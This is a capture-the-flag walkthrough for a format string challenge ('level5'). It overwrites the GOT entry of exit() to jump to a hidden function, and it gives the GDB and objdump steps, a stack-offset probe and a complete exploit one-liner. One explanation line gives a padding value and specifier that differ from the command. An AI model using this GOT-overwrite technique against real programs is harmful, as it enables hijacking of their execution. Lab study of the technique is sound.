@@ -1,0 +1,66 @@
+Walkthrough: Format String Exploitation via GOT Overwrite (level5)
+
+Objective:
+Redirect execution flow by overwriting the GOT entry of `exit()` with the address of a custom function (`o`) using a format string vulnerability.
+
+---
+
+Step 1: Get the Address of the Target Function
+
+We want the program to execute the function `o` instead of exiting normally.
+
+Use GDB to get its address:
+    (gdb) run
+    (gdb) p o
+    $1 = {<text variable, no debug info>} 0x80484a4 <o>
+
+This means the address of function `o` is: 0x80484a4 (decimal: 134513828)
+
+---
+
+Step 2: Locate the GOT Entry of `exit()`
+
+The exit function is called normally when the program terminates. We want to hijack this by overwriting its GOT entry.
+
+Use objdump to find its location in memory:
+    level5@RainFall:~$ objdump -R level5 | grep exit
+    08049828 R_386_JUMP_SLOT   _exit
+    08049838 R_386_JUMP_SLOT   exit
+
+We'll use the GOT entry for `exit` at: 0x08049838
+
+---
+
+Step 3: Determine Stack Offset of Format String Argument
+
+We need to determine where our input (address) lies on the stack.
+
+Command:
+    python -c 'print ("0000 " + "%x " * 20)' | ./level5
+
+Look for the 4-character string "0000" in the output. For example:
+    0000 200 b7fd1ac0 b7ff37d0 30303030 20782520 25207825
+
+From this output, we determine that our input is at the 4th position on the stack.
+
+---
+
+Step 4: Craft the Exploit Payload
+
+We now construct a payload that:
+1. Places the GOT address of `exit()` at the beginning.
+2. Pads the output to reach the desired number of characters.
+3. Uses `%4$n` to write the total number of printed characters to the address given (exit GOT entry).
+
+Exploit command:
+    (python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"' && cat) | ./level5
+
+Explanation:
+- \x38\x98\x04\x08 → address of the GOT entry for `exit()` (little endian format)
+- %134513828d → print 134,513,828 characters (the address of function `o`)
+- %4$n → write the value into the 4th stack argument, which corresponds to our provided address
+
+---
+
+Result:
+When the program tries to call `exit()`, it instead jumps to the function `o`, achieving the desired control flow hijack.
